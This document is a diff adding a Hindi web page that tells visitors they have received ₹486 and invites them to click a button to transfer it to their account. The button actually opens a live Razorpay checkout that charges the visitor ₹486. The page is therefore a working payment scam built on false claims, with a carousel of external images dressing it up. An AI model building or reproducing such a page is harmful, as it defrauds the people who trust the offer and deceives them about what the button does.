@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="hi">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>पैसे ट्रांसफर करें</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #fffbe7;
+            padding: 20px;
+        }
+
+        .slider {
+            position: relative;
+            width: 100%;
+            max-width: 400px;
+            margin: 20px auto;
+            overflow: hidden;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .slides {
+            display: flex;
+            transition: transform 0.5s ease-in-out;
+        }
+
+        .slides img {
+            width: 100%;
+            flex-shrink: 0;
+        }
+
+        .dots {
+            display: flex;
+            justify-content: center;
+            margin-top: 10px;
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            margin: 0 5px;
+            background-color: #bbb;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+
+        .dot.active {
+            background-color: #007BFF;
+        }
+
+        button {
+            font-size: 18px;
+            padding: 10px 20px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>आपको ₹486 मिले हैं</h1>
+    <p>₹486 ट्रांसफर करने के लिए नीचे दिए गए बटन पर क्लिक करें।</p>
+
+    <!-- Image Slider -->
+    <div class="slider">
+        <div class="slides">
+            <img src="https://i.imghippo.com/files/Jdv6685sE.jpg" alt="Slide Image 1">
+            <img src="https://i.imghippo.com/files/rI5180OY.jpg" alt="Slide Image 2">
+            <img src="https://i.imghippo.com/files/EaU8573cmY.jpg" alt="Slide Image 3">
+            <img src="https://i.imghippo.com/files/OQ3376GA.jpg" alt="Slide Image 4">
+        </div>
+    </div>
+
+    <div class="dots">
+        <span class="dot active" onclick="setSlide(0)"></span>
+        <span class="dot" onclick="setSlide(1)"></span>
+        <span class="dot" onclick="setSlide(2)"></span>
+        <span class="dot" onclick="setSlide(3)"></span>
+    </div>
+
+    <!-- Slider के नीचे नई इमेज -->
+    <img src="https://i.imghippo.com/files/ur7157i.jpg" alt="ur7157i.jpg" style="width:100%; max-width:400px; margin:20px auto; display:block;">
+
+    <!-- Razorpay बटन -->
+    <button id="pay-button">💰 खाते में ट्रांसफर करें 💰</button>
+
+    <!-- बटन के नीचे नई इमेज -->
+    <img src="https://i.imghippo.com/files/sr6125CI.jpg" alt="sr6125CI.jpg" style="width:100%; max-width:400px; margin:20px auto; display:block;">
+
+    <!-- Razorpay Checkout Script -->
+    <script src="https://checkout.razorpay.com/v1/checkout.js"></script>
+    <script>
+        document.getElementById('pay-button').onclick = function () {
+            var options = {
+                "key": "rzp_live_elxzEEFkwxBLHR", // आपकी लाइव Razorpay Key
+                "amount": 48600, // राशि पैसे में (₹486 = 48600 पैसे)
+                "currency": "INR",
+                "name": "आपकी कंपनी का नाम",
+                "description": "₹486 ट्रांसफर",
+                "handler": function (response) {
+                    alert("पेमेंट सफल रहा! पेमेंट आईडी: " + response.razorpay_payment_id);
+                },
+                "prefill": {
+                    "name": "उपयोगकर्ता का नाम",
+                    "email": "user@example.com",
+                    "contact": "9876543210"
+                },
+                "theme": {
+                    "color": "#007BFF"
+                }
+            };
+            var rzp1 = new Razorpay(options);
+            rzp1.open();
+        };
+
+        // Slider functionality
+        let currentSlide = 0;
+
+        function setSlide(index) {
+            currentSlide = index;
+            const slides = document.querySelector('.slides');
+            slides.style.transform = `translateX(-${currentSlide * 100}%)`;
+            updateDots();
+        }
+
+        function updateDots() {
+            const dots = document.querySelectorAll('.dot');
+            dots.forEach((dot, index) => {
+                dot.classList.toggle('active', index === currentSlide);
+            });
+        }
+
+        setInterval(() => {
+            currentSlide = (currentSlide + 1) % 4;
+            setSlide(currentSlide);
+        }, 3000);
+    </script>
+</body>
+
+</html>
